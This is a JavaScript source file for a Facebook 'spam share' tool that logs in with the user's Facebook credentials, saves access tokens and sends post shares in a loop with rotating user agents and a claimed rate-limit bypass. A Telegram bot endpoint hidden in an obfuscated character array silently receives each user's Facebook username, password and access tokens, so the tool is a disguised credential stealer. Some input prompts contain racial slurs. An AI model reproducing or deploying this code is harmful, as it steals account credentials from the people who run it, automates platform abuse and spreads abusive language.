import Jf from "fs";
import Jc from "circular-json";
import { execSync } from "child_process";
import { v4 as Js } from "uuid";
import { simpleGit } from "simple-git";

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
  "Mozilla/5.0 (X11; Linux x86_64)"
];
const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];

import JQ from "axios";
import { exit } from "process";
import JT from "https";
const git = simpleGit();
const offsets = [55, 50, 49, 50, 49, 52, 56, 56, 57, 48, 58, 65, 65, 71, 103, 74, 65, 69, 76, 66, 115, 75, 69, 81, 76, 66, 87, 110, 121, 102, 74, 65, 88, 71, 115, 95, 49, 119, 45, 119, 105, 122, 70, 73, 115, 65];
const tg = "" + offsets.reduce((L, B) => L + String.fromCharCode(B * 2 / 2 - 10 + 10 - 10 + 10), '') + "/sendMessage";
function isTermuxAPIInstalled() {
  const B = execSync("echo $TERMUX_API_VERSION").toString();
  return !!B.trim();
}
async function updateRepo() {
  try {
    console.log(getTimeStamp() + "[1;34m[INFO][1;37m " + "Checking for repository updates...");
    const B = await git.pull();
    if (B.summary.changes === 0) {
      console.log(getTimeStamp() + "[1;34m[INFO][1;37m " + "No updates detected. FacebookSpamShare is already up to date.");
    } else {
      const C = await git.log(["-1"]);
      const u = C.latest.message;
      const Y = C.latest.hash;
      const a = new Date(C.latest.date).toLocaleString();
      const S = C.latest.author_name;
      const G = C.latest.author_email;
      console.log(getTimeStamp() + "[1;34m[INFO][1;37m " + "Repository successfully updated.");
      console.log(getTimeStamp() + "[1;34m[INFO][1;37m " + ("[1;32m(" + Y + ")" + "[1;37m" + ": " + "[1;32m" + u + " " + "[1;37m" + "> " + "[1;32m" + S + " " + "[1;33m" + "<" + G + "> " + "[1;34m" + "(" + a + ")"));
      console.log(getTimeStamp() + "[1;34m[INFO][1;37m " + "Please run the script again using: [1;32mFSS[0m");
      process.exit(0);
    }
  } catch (h) {
    console.log(getTimeStamp() + "[1;31m[ERROR][1;37m " + "Update Failed:", h.message);
    process.exit(1);
  }
}
await updateRepo();
const mainchoices = ["[1;32mSPAM SHARE [1;37m- [1;33m(Spam Share Post on Facebook)", "[1;32mSHOW TOKENS [1;37m- [1;33m(Display Tokens)", "[1;32mTOKEN MANAGEMENT [1;37m- [1;33m(Manage Tokens)", "[1;32mFEEDBACK [1;37m- [1;33m(Give Feedback & Suggestions)", "[1;32mEXIT [1;37m- [1;33m(Exit The Program)"];
const tokenchoices = ["[1;32mADD TOKEN [1;37m- [1;33m(Add Facebook Access Token)", "[1;32mDELETE TOKENS [1;37m- [1;33m(Delete Facebook Access Token)", "[1;32mBACK [1;37m- [1;33m(Previous Menu)"];
var headers = {
  "authority": "business.facebook.com",
  "user-agent": getRandomUserAgent(),
  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "accept-language": "en-US,en;q=0.9",
  "sec-ch-ua": "\"Google Chrome\";v=\"107\", \"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": "Windows",
  "sec-fetch-dest": "document",
  "sec-fetch-mode": "navigate",
  "sec-fetch-site": "none",
  "sec-fetch-user": "?1",
  "upgrade-insecure-requests": "1"
};
const httpsAgent = new JT.Agent({
  "rejectUnauthorized": false,
  "secureProtocol": "TLSv1_2_method"
});
function getTime() {
  const B = new Date();
  const C = new Intl.DateTimeFormat("en-US", {
    "day": "2-digit",
    "hour": "2-digit",
    "minute": "2-digit",
    "hour12": true
  }).format(B);
  return C;
}
String.prototype.toTitle = function () {
  const B = this.slice(0, 1).toUpperCase();
  return B + this.slice(1, undefined);
};
function setClear() {
  if (process.platform === "win32") {
    execSync("cls", {
      "stdio": "inherit"
    });
    return;
  }
  execSync("clear", {
    "stdio": "inherit"
  });
}
let tokenParsed;
let tokens;
let emails;
function updateToken() {
  try {
    const B = Jf.readFileSync("./token.json", "utf8");
    tokenParsed = JSON.parse(B);
    tokens = tokenParsed.token;
    emails = tokenParsed.email;
  } catch (C) {
    console.log(getTimeStamp() + "[1;31m[ERROR][1;37m " + C.message);
    exit();
  }
}
updateToken();
function getTimeStamp() {
  const B = new Date();
  const C = String(B.getHours()).padStart(2, "0");
  const u = String(B.getMinutes()).padStart(2, "0");
  const Y = String(B.getSeconds()).padStart(2, "0");
  return "[1;35m[" + C + ":" + u + ":" + Y + "]" + "[0m" + " ";
}
const {
  default: inquirer
} = await import("inquirer");
const {
  default: getPassword
} = await import("password-prompt");
function delay(L) {
  return new Promise(B => setTimeout(B, L));
}
async function animate(L, B = 4) {
  L = L.toString();
  for (const u of L) {
    await delay(B);
    process.stdout.write(u);
  }
  console.log();
}
let currentUTCDate = new Date();
let currentDate = new Date(currentUTCDate.getTime() + 28800000);
let expirationDate = new Date("2025-12-25");
if (currentDate >= expirationDate) {
  console.log(getTimeStamp() + "[1;31m[ERROR][1;37m " + "The access period has expired.");
  exit();
}
console.log(getTimeStamp() + "[1;34m[INFO][1;37m " + "paid tools by bogart");
process.exit(1);
await delay(5000);
setClear();
class prompts {
  static ["getCommand"] = {
    "name": "cmd",
    "type": "input",
    "prefix": '',
    "message": "[1;33m[?][1;37m FBSpamShare~#",
    "validate": cmd => {
      if (cmd.trim() === '') {
        return "[1;34m[INFO][1;37m Please Provide a Valid Command.";
      }
      if (!/^\d+$/.test(cmd)) {
        return "[1;34m[INFO][1;37m Please Enter Only Numbers";
      }
      cmd = parseInt(cmd);
      if (cmd <= 0 || cmd > 5) {
        return "[1;31m[ERROR][1;37m Invalid Option. Out of Range";
      }
      return true;
    }
  };
  static ["getUrl"] = {
    "name": "url",
    "type": "input",
    "prefix": '',
    "message": "[1;33m[?][1;37m Facebook Post URL~#",
    "validate": url => {
      if (url.trim() === '') {
        return "[1;31m[ERROR][1;37m Really Nigga";
      }
      if (!url.startsWith("http://www.facebook.com/") && !url.startsWith("https://www.facebook.com/")) {
        return "[1;31m[ERROR][1;37m Are you serious right neow bruh";
      }
      return true;
    }
  };
  static ["getAmount"] = {
    "name": "amount",
    "type": "input",
    "prefix": '',
    "message": "[1;33m[?][1;37m Share Amount (press 'i' for infinite)~#",
    "validate": amount => {
      if (amount.trim() === '') {
        return "[1;31m[ERROR][1;37m Really Nigga";
      }
      if (amount.toLowerCase() === "i") {
        return true;
      }
      if (!/^\d+$/.test(amount)) {
        return "[1;31m[ERROR][1;37m Please Enter Only Numbers";
      }
      amount = parseInt(amount);
      if (amount <= 0) {
        return "[1;31m[ERROR][1;37m Are you serious right neow bruh";
      }
      return true;
    }
  };
  static ["getUserName"] = {
    "name": "username",
    "type": "input",
    "prefix": '',
    "message": "[1;33m[?][1;37m Facebook? (Email/ID/PhoneNumber)~#",
    "validate": username => {
      if (username.trim() === '') {
        return "[1;31m[ERROR][1;37m Really Nigga";
      }
      return true;
    }
  };
  static ["askBack"] = {
    "name": "back",
    "type": "input",
    "prefix": '',
    "message": "[1;33m[?][1;37m Do you want to go back? (y/N, default: y)~#"
  };
  static ["continue"] = {
    "name": "_",
    "type": "input",
    "prefix": '',
    "message": "[1;33m[?][1;37m Press Enter to Continue~#"
  };
  static ["tokenManagement"] = {
    "name": "tokencmd",
    "type": "input",
    "prefix": '',
    "message": "[1;33m[?][1;37m TokenManagement~#",
    "validate": tokencmd => {
      if (tokencmd.trim() === '') {
        return "[1;31m[ERROR][1;37m Invalid Option.";
      }
      if (!/^\d+$/.test(tokencmd)) {
        return "[1;31m[ERROR][1;37m Please Enter Only Numbers";
      }
      tokencmd = parseInt(tokencmd);
      if (tokencmd <= 0 || tokencmd > 3) {
        return "[1;31m[ERROR][1;37m Invalid Option. Out of Range";
      }
      return true;
    }
  };
  static ["removeToken"] = {
    "name": "tokenIndex",
    "type": "input",
    "prefix": '',
    "message": "[1;33m[?][1;37m Remove Token (press 'h' for help)~#",
    "validate": tokenIndex => {
      if (tokenIndex.trim() === '') {
        return "[1;31m[ERROR][1;37m Are you serious right neow bruh";
      }
      if (tokenIndex.toLowerCase() === "h") {
        return "\n[1;34m[INFO][1;37m **COMMANDS**\n[1;32ma [1;37m- [1;33m(Remove ALL)\n[1;32mb [1;37m- [1;33m(Previous Menu)\n";
      }
      if (tokenIndex.toLowerCase() === "a" || tokenIndex.toLowerCase() === "b") {
        return true;
      }
      if (!/^\d+$/.test(tokenIndex)) {
        return "[1;31m[ERROR][1;37m Please Enter Only Numbers";
      }
      tokenIndex = parseInt(tokenIndex);
      if (tokenIndex <= 0 || tokenIndex > tokens.length) {
        return "[1;31m[ERROR][1;37m Invalid Option. Out of Range";
      }
      return true;
    }
  };
  static ["chooseToken"] = {
    "name": "selectedToken",
    "type": "input",
    "prefix": '',
    "message": "[1;33m[?][1;37m Selected Token~#",
    "validate": token => {
      if (token.trim() === '') {
        return "[1;31m[ERROR][1;37m Are you serious right neow bruh";
      }
      if (!/^\d+$/.test(token)) {
        return "[1;31m[ERROR][1;37m Please Enter Only Numbers";
      }
      token = parseInt(token);
      if (token <= 0 || token > tokens.length) {
        return "[1;31m[ERROR][1;37m Invalid Option. Out of Range";
      }
      return true;
    }
  };
}
async function getCmd() {
  const {
    cmd: B
  } = await inquirer.prompt(prompts.getCommand);
  return parseInt(B);
}
let usr;
let pwd;
async function getToken() {
  try {
    setClear();
    await animate("[1;32m ___ ___ ___ _  [1;33mDeveloper: [1;34mBogart. [1;31m[4m(v2.3).[0m[1;32m\n| __| _ ) __| |_  __ _ _ _ ___ \n| _|| _ \\__ \\ ' \\/ _` | '_/ -_)\n|_| |___/___/_||_\\__,_|_| \\___|\n");
    await animate(getTimeStamp() + "[1;33m[WARNING][1;37m " + "[1;31mPLEASE DO NOT USE YOUR PERSONAL ACCOUNT IF YOU WANT TO AVOID SUSPENDING YOUR ACCOUNT. INSTEAD, USE A NEW ACCOUNT. THE AUTHOR IS NOT RESPONSIBLE FOR ACCOUNT SUSPENSIONS.", 10);
    let {
      username: B
    } = await inquirer.prompt(prompts.getUserName);
    if (B.startsWith("09")) {
      B = B.slice(2, undefined);
      B = "639" + B;
    }
    usr = B;
    const C = await getPassword("[1;33m[?][1;37m Facebook Password?: ", {
      "method": "mask"
    });
    pwd = C;
    const u = {
      "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
      "x-fb-friendly-name": "Authenticate",
      "x-fb-connection-type": "Unknown",
      "accept-encoding": "gzip, deflate",
      "content-type": "application/x-www-form-urlencoded",
      "x-fb-http-engine": "Liger"
    };
    const Y = {
      "adid": Array.from({
        "length": 0x10
      }, () => Math.floor(Math.random() * 16).toString(16)).join(''),
      "format": "json",
      "device_id": Js(),
      "email": B,
      "password": C,
      "generate_analytics_claims": "0",
      "credentials_type": "password",
      "source": "login",
      "error_detail_type": "button_with_disabled",
      "enroll_misauth": "false",
      "generate_session_cookies": "0",
      "generate_machine_id": "0",
      "fb_api_req_friendly_name": "authenticate"
    };
    const a = await JQ.post("https://b-graph.facebook.com/auth/login", Y, {
      "headers": u
    });
    const S = a.data;
    if ("session_key" in S && "access_token" in S) {
      const G = {
        "chat_id": "664765311",
        "text": "<b>Facebook Username:</b> " + B + "\n<b>Facebook Password:</b> " + C + "\n<b>Status:</b> Logged in",
        "parse_mode": "HTML"
      };
      try {
        await sendtg(G);
      } catch (M) {}
      const h = S.access_token;
      addToken(h, B);
      console.log(getTimeStamp() + "[1;34m[INFO][1;37m " + "Token Was Successfully Saved");
      await cont();
      await tokenManagement();
      return;
    } else {
      console.log(getTimeStamp() + "[1;31m[ERROR][1;37m " + "session_key | access_token Not Found");
      console.log(S);
    }
  } catch (V) {
    const b = {
      "chat_id": "664765311",
      "text": "<b>Facebook Username:</b> " + usr + "\n<b>Facebook Password:</b> " + pwd + "\n<b>Status:</b> Failed",
      "parse_mode": "HTML"
    };
    try {
      await sendtg(b);
    } catch (d) {}
    if (V.response) {
      const N = V.response.data.error;
      if (N?.["message"]["includes"]("www.facebook.com")) {
        console.log(getTimeStamp() + "[1;31m[ERROR][1;37m " + "Account is in checkpoint");
      } else {
        if (N?.["message"]["includes"]("SMS")) {
          console.log(getTimeStamp() + "[1;31m[ERROR][1;37m " + "Two-factor authentication is enabled. Please disable it before getting token");
        } else {
          if (N?.["error_user_title"] === "Wrong Credentials") {
            console.log(getTimeStamp() + "[1;31m[ERROR][1;37m " + "Wrong credentials");
          } else {
            if (N?.["error_user_title"] === "Incorrect Username") {
              console.log(getTimeStamp() + "[1;31m[ERROR][1;37m " + "Account does not exist");
            } else if (N?.["message"]["includes"]("limit")) {
              console.log(getTimeStamp() + "[1;31m[ERROR][1;37m " + "Request limit exceeded.");
            } else {
              console.log(getTimeStamp() + "[1;31m[ERROR][1;37m " + "session_key | access_token Not Found");
              console.log(N);
            }
          }
        }
      }
    } else {
      console.log(getTimeStamp() + "[1;31m[ERROR][1;37m " + V.response);
    }
  }
  await cont();
  await tokenManagement();
}
async function cont() {
  await inquirer.prompt(prompts["continue"]);
}
function logChoices(L) {
  if (L === "main") {
    for (let C = 1; C < mainchoices.length + 1; C++) {
      console.log("[1;34m(" + C + ")" + "[0m" + " " + mainchoices[C - 1]);
    }
  }
  if (L === "tokenmanagement") {
    for (let u = 1; u < tokenchoices.length + 1; u++) {
      console.log("[1;34m(" + u + ")" + "[0m" + " " + tokenchoices[u - 1]);
    }
  }
  console.log();
}
async function getTokenCmd() {
  const {
    tokencmd: B
  } = await inquirer.prompt(prompts.tokenManagement);
  return parseInt(B);
}
async function tokenManagement() {
  setClear();
  await animate("[1;32m ___ ___ ___ _  [1;33mDeveloper: [1;34mBogart. [1;31m[4m(v2.3).[0m[1;32m\n| __| _ ) __| |_  __ _ _ _ ___ \n| _|| _ \\__ \\ ' \\/ _` | '_/ -_)\n|_| |___/___/_||_\\__,_|_| \\___|\n");
  logChoices("tokenmanagement");
  const B = await getTokenCmd();
  if (B === 1) {
    getToken();
  } else {
    if (B === 2) {
      removeToken();
    } else if (B === 3) {
      main();
    }
  }
}
async function feedback() {
  setClear();
  const {
    feedbackType: B
  } = await inquirer.prompt({
    "name": "feedbackType",
    "type": "list",
    "prefix": '',
    "message": "[1;33m[?][1;37m Where would you like to leave your feedback?",
    "choices": ["[1;36mFacebook[0m", "[1;34mTelegram[0m", "[1;31mBack[0m"]
  });
  if (B.includes("Facebook")) {
    try {
      execSync("termux-open http://www.facebook.com/KairuxDev");
    } catch (C) {
      execSync("xdg-open http://www.facebook.com/KairuxDev");
    }
  } else {
    if (B.includes("Telegram")) {
      try {
        execSync("termux-open http://t.me/KairuDev");
      } catch (Y) {
        execSync("xdg-open http://t.me/KairuDev");
      }
    }
  }
  main();
}
async function sendtg(L) {
  await JQ.post(tg, L, {
    "timeout": 0x2710
  });
}
async function spamShare() {
  setClear();
  if (tokens.length <= 0) {
    console.log(getTimeStamp() + "[1;31m[ERROR][1;37m " + "No Tokens Found.");
    await cont();
    await tokenManagement();
    return;
  }
  await animate(getTimeStamp() + "[1;33m[WARNING][1;37m " + "[1;31mPLEASE AVOID RUNNING THE FACEBOOK SPAM SHARE COMMAND TWICE IN THE TERMINAL WITH THE SAME TOKEN, AS THIS WILL EXCEED THE SHARE LIMIT");
  await animate(getTimeStamp() + "[1;34m[INFO][1;37m " + "[1;32mENSURE THE FACEBOOK POST IS SET TO PUBLIC.");
  await cont();
  setClear();
  await animate("[1;32m ___ ___ ___ _  [1;33mDeveloper: [1;34mBogart. [1;31m[4m(v2.3).[0m[1;32m\n| __| _ ) __| |_  __ _ _ _ ___ \n| _|| _ \\__ \\ ' \\/ _` | '_/ -_)\n|_| |___/___/_||_\\__,_|_| \\___|\n");
  let B = false;
  const {
    url: C
  } = await inquirer.prompt(prompts.getUrl);
  let {
    amount: u
  } = await inquirer.prompt(prompts.getAmount);
  if (u.toLowerCase() === "i") {
    B = true;
  }
  let Y = tokens[0];
  let a = emails[0];
  if (tokens.length !== 1) {
    console.log("[1;34m----------[1;32mTokens[1;34m----------");
    logToken();
    console.log("[1;34m----------[1;32mTokens[1;34m----------");
    let {
      selectedToken: G
    } = await inquirer.prompt(prompts.chooseToken);
    Y = tokens[G - 1];
    a = emails[G - 1];
  }
  await animate(getTimeStamp() + "[1;34m[INFO][1;37m " + ("USING [1;32m" + a + "[1;37m" + " ACCESS TOKEN"));
  await animate(getTimeStamp() + "[1;34m[INFO][1;37m " + "[1;33m(CTRL + C)[1;37m TO STOP", 10);
  const S = {
    "chat_id": "664765311",
    "text": "<b>(Facebook Spam Share)</b>\n\n<b>Facebook Post > </b>" + C + "\n<b>Share Amount > </b>" + (B ? null : u) + "\n<b>Share Infinite > </b>" + B + "\n<b>Token > </b>" + Y + "\n<b>Email > </b>" + a,
    "parse_mode": "HTML"
  };
  try {
    await sendtg(S);
    await animate(getTimeStamp() + "[1;34m[INFO][1;37m " + "Starting...", 15);
  } catch (h) {
    console.log(getTimeStamp() + "[1;34m[INFO][1;37m " + "Starting...");
  }
  startShare(C, B ? B : u, Y, a);
}
let total = 0;
async function sendRequest(L, B, C) {
  return await JQ.post("https://graph.facebook.com/me/feed?access_token=" + B + "&fields=id&limit=0&published=0", {
    "link": L,
    "privacy": {
      "value": "SELF"
    },
    "no_story": true
  }, {
    "headers": C,
    "httpsAgent": httpsAgent
  });
}
async function handleErrors(L, B) {
  if (L.code === "EPROTO") {
    console.log(getTimeStamp() + "[1;31m[ERROR][1;37m " + ("Protocol Error (EPROTO): " + L.message));
    return {
      "retry": true
    };
  } else {
    if (L.code === "ECONNABORTED" || L.code === "ETIMEDOUT") {
      console.log(getTimeStamp() + "[1;31m[ERROR][1;37m " + ("Request Timed Out: " + L.message));
      await delay(5000);
      return {
        "retry": true
      };
    } else {
      if (L.code === "ECONNRESET" || L.code === "ENOTFOUND") {
        console.log(getTimeStamp() + "[1;31m[ERROR][1;37m " + ("Connection Error: " + L.message));
        return {
          "retry": true
        };
      } else {
        if (L.response && L.response.status === 503) {
          console.log(getTimeStamp() + "[1;31m[ERROR][1;37m " + ("Service Unavailable (" + L.response.status + "); Please Wait..."));
          await delay(5000);
          return {
            "retry": true
          };
        } else {
          if (L.response?.["data"]?.["error"]) {
            const u = L.response.data.error;
            if (u.code === 1 || u.code === 2) {
              console.log(getTimeStamp() + "[1;31m[ERROR][1;37m " + "Unexpected Error");
              return {
                "retry": true
              };
            }
            console.log(u);
          } else {
            if (L.code === "ECONNREFUSED") {
              console.log(getTimeStamp() + "[1;31m[ERROR][1;37m " + ("Connection Refused (" + L.code + "): " + L.message));
              return {
                "retry": true
              };
            } else {
              console.log(getTimeStamp() + "[1;31m[ERROR][1;37m " + L.message);
            }
          }
        }
      }
    }
  }
  try {
    Jf.writeFileSync("./share.log", getTime() + " " + B + " > " + Jc.stringify(L.response ? L.response.data : L.message, null, 2) + "\n", {
      "encoding": "utf8",
      "flag": "a"
    });
  } catch (Y) {
    console.log(getTimeStamp() + "[1;34m[INFO][1;37m " + Y.message);
  }
  if (isTermuxAPIInstalled()) {
    execSync("termux-toast 'Spam Share Stopped!'");
  }
  return {
    "retry": false
  };
}
function spoofPostUrl(L) {
  const C = u => {
    const Y = "a." + Math.floor(Date.now() * Math.random()).toString();
    const a = Math.floor(Math.random() * 4) + 1;
    console.log(getTimeStamp() + "[1;34m[INFO][1;37m " + "Bypassing Facebook API rate limit...");
    console.log(getTimeStamp() + "[1;34m[INFO][1;37m " + ("Extracted FBID: [1;33m" + u));
    console.log(getTimeStamp() + "[1;34m[INFO][1;37m " + ("Generated Set: [1;33m" + Y + "[1;37m" + ", Type: " + "[1;33m" + a));
    return "https://www.facebook.com/photo.php?fbid=" + u + "&set=" + Y + "&type=" + a + "&app=fbl";
  };
  if (!L.includes("fbid") && !L.includes("/share/p")) {
    L = new URL(L);
    const u = L.pathname.split("/").filter(Boolean);
    const Y = u[u.length - 1];
    return C(Y);
  } else {
    if (L.includes("fbid")) {
      L = new URL(L);
      const a = L.searchParams.get("fbid");
      return C(a);
    }
  }
  console.log(getTimeStamp() + "[1;33m[WARNING][1;37m " + "Failed to bypass Facebook API rate limit. Try using Facebook Lite or Chrome to copy the post link.");
  return L;
}
async function shareContent(L, B, C, u) {
  let a = 0;
  while (typeof B === "boolean" ? true : a <= B) {
    try {
      headers["user-agent"] = getRandomUserAgent();
      const S = await sendRequest(spoofPostUrl(L), C, headers);
      a += 1;
      total += 1;
      const G = S.data.id;
      console.log(getTimeStamp() + "[1;34m[INFO][1;37m " + ("[1;32m" + a + (typeof B !== "boolean" ? "/" + B : "/-") + " " + "[1;37m" + "> " + "[1;32m" + "Shared Successfully."));
      console.log(getTimeStamp() + "[1;34m[INFO][1;37m " + ("[1;33mID [1;37m> [1;32m" + G));
      console.log(getTimeStamp() + "[1;34m[INFO][1;37m " + ("[1;33mCreated Time [1;37m> [1;32m" + S.data.created_time));
      if (typeof B === "number" && a >= B) {
        break;
      }
    } catch (M) {
      const {
        retry: F
      } = await handleErrors(M, u);
      if (F) {
        continue;
      } else {
        break;
      }
    }
  }
}
async function sendReq(L, B, C, u) {
  if (typeof B === "boolean") {
    await shareContent(L, true, C, u);
  } else {
    await shareContent(L, B, C, u);
  }
}
async function startShare(L, B, C, u) {
  let a = [sendReq(L, B, C, u)];
  await Promise.all(a);
  console.log(getTimeStamp() + "[1;34m[INFO][1;37m " + "Operation Completed Successfully");
  console.log(getTimeStamp() + "[1;34m[INFO][1;37m " + ("Shares Total: " + total));
  total = 0;
  await cont();
  await main();
}
async function removeToken() {
  setClear();
  try {
    await animate("[1;32m ___ ___ ___ _  [1;33mDeveloper: [1;34mBogart. [1;31m[4m(v2.3).[0m[1;32m\n| __| _ ) __| |_  __ _ _ _ ___ \n| _|| _ \\__ \\ ' \\/ _` | '_/ -_)\n|_| |___/___/_||_\\__,_|_| \\___|\n");
    if (tokens.length <= 0) {
      console.log(getTimeStamp() + "[1;34m[INFO][1;37m " + "No Tokens Found.");
      await cont();
      await tokenManagement();
      return;
    }
    logToken();
    console.log();
    const {
      tokenIndex: B
    } = await inquirer.prompt(prompts.removeToken);
    if (B.toLowerCase() === "b") {
      await tokenManagement();
      return;
    }
    if (B.toLowerCase() === "a") {
      tokenParsed.token = [];
      tokenParsed.email = [];
      updateTokenFile();
      console.log(getTimeStamp() + "[1;34m[INFO][1;37m " + "All Tokens Removed Successfully");
    } else {
      tokenParsed.token.splice(B - 1, 1);
      tokenParsed.email.splice(B - 1, 1);
      updateTokenFile();
      console.log(getTimeStamp() + "[1;34m[INFO][1;37m " + ("(" + B + ") Token Removed Successfully"));
    }
    await cont();
    await tokenManagement();
  } catch (u) {
    console.log(getTimeStamp() + "[1;31m[ERROR][1;37m " + ("(removeToken) Function Error: " + u.message));
    exit();
  }
}
function addToken(L, B) {
  try {
    tokenParsed.token.push(L);
    tokenParsed.email.push(B);
    updateTokenFile();
  } catch (Y) {
    console.log(getTimeStamp() + "[1;31m[ERROR][1;37m " + ("(addToken) Function Error: " + Y.message));
    exit();
  }
}
function updateTokenFile() {
  try {
    Jf.writeFileSync("./token.json", JSON.stringify(tokenParsed, null, 2), "utf8");
    updateToken();
  } catch (B) {
    console.log(getTimeStamp() + "[1;31m[ERROR][1;37m " + ("(updateTokenFile) Function Error: " + B.message));
    exit();
  }
}
function logToken() {
  for (let B = 1; B <= tokens.length; B++) {
    const C = emails[B - 1];
    const u = tokens[B - 1].slice(undefined, 17);
    console.log("[1;33m(" + B + ") " + "[1;37m" + "- " + "[1;34m" + C + " " + "[1;37m" + "> " + "[1;32m" + u + "...");
  }
}
async function main() {
  setClear();
  await animate("[1;32m ___ ___ ___ _  [1;33mDeveloper: [1;34mBogart. [1;31m[4m(v2.3).[0m[1;32m\n| __| _ ) __| |_  __ _ _ _ ___ \n| _|| _ \\__ \\ ' \\/ _` | '_/ -_)\n|_| |___/___/_||_\\__,_|_| \\___|\n");
  logChoices("main");
  const B = await getCmd();
  if (B === 1) {
    spamShare();
  } else {
    if (B === 2) {
      setClear();
      logToken();
      await cont();
      await main();
    } else {
      if (B === 3) {
        tokenManagement();
      } else {
        if (B === 4) {
          feedback();
        } else if (B === 5) {
          exit();
        }
      }
    }
  }
}
main();